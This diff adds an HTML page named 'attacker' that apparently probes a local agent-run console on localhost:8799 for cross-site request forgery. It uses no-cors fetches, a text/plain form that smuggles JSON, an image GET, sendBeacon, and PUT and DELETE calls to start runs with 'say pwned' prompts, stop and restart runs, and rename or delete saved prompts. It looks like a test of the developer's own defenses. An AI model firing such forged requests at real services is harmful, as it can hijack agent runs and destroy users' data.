@@ -1,0 +1,28 @@
+<!doctype html><html><head><meta charset="utf-8"><title>attacker</title></head><body>
+<pre id="log"></pre>
+<iframe name="sink" style="display:none"></iframe>
+<form id="f" method="POST" action="http://localhost:8799/runs" enctype="text/plain" target="sink"><input name='{"prompt":"ATTACK-FORM say pwned","x":"' value='"}'></form>
+<img src="http://localhost:8799/runs/2026-09-30T12-05-49-457Z/restart" onerror="L('img GET restart: load error (expected, JSON not image)')" onload="L('img loaded')">
+<script>
+const B = "http://localhost:8799", RUN = "2026-09-30T12-05-49-457Z", PID = "99090bb4-9555-41be-9abe-c7fd38e9a77d";
+const L = (m) => (document.getElementById("log").textContent += m + "\n");
+const nc = (path, body) => fetch(B + path, { method: "POST", mode: "no-cors", headers: { "content-type": "text/plain" }, body }).then(() => L("no-cors POST " + path + ": sent (opaque)")).catch((e) => L("no-cors POST " + path + ": " + e));
+(async () => {
+  await nc("/prompts", JSON.stringify({ title: "ATTACK-PROMPT", text: "x" }));
+  await nc("/runs", JSON.stringify({ prompt: "ATTACK-NOCORS say pwned" }));
+  await nc("/runs/" + RUN + "/stop", "{}");
+  await nc("/runs/" + RUN + "/end", "{}");
+  await nc("/runs/" + RUN + "/restart", "{}");
+  await nc("/runs/" + RUN + "/message", JSON.stringify({ text: "ATTACK-FOLLOWUP say pwned" }));
+  // CORS request WITH our custom header -> needs a preflight the server never approves
+  await fetch(B + "/runs", { method: "POST", headers: { "content-type": "application/json", "x-worker-console": "1" }, body: JSON.stringify({ prompt: "ATTACK-CORS" }) }).then((r) => L("cors POST /runs: status " + r.status)).catch((e) => L("cors POST /runs: " + e));
+  await fetch(B + "/prompts/" + PID, { method: "PUT", headers: { "content-type": "application/json", "x-worker-console": "1" }, body: JSON.stringify({ title: "ATTACK-RENAMED", favourite: true }) }).then((r) => L("cors PUT prompt: status " + r.status)).catch((e) => L("cors PUT prompt: " + e));
+  await fetch(B + "/prompts/" + PID, { method: "DELETE" }).then((r) => L("cors DELETE prompt: status " + r.status)).catch((e) => L("cors DELETE prompt: " + e));
+  await fetch(B + "/prompts/" + PID, { method: "DELETE", mode: "no-cors" }).then(() => L("no-cors DELETE prompt: sent")).catch((e) => L("no-cors DELETE prompt: " + e));
+  L("sendBeacon /runs: " + navigator.sendBeacon(B + "/runs", new Blob([JSON.stringify({ prompt: "ATTACK-BEACON" })], { type: "text/plain" })));
+  document.getElementById("f").submit(); L("form POST /runs: submitted");
+  // can the page READ console data cross-origin?
+  await fetch(B + "/runs").then((r) => r.text()).then((t) => L("cors GET /runs readable: " + t.slice(0, 60))).catch((e) => L("cors GET /runs: " + e));
+  setTimeout(() => L("DONE"), 1500);
+})();
+</script></body></html>
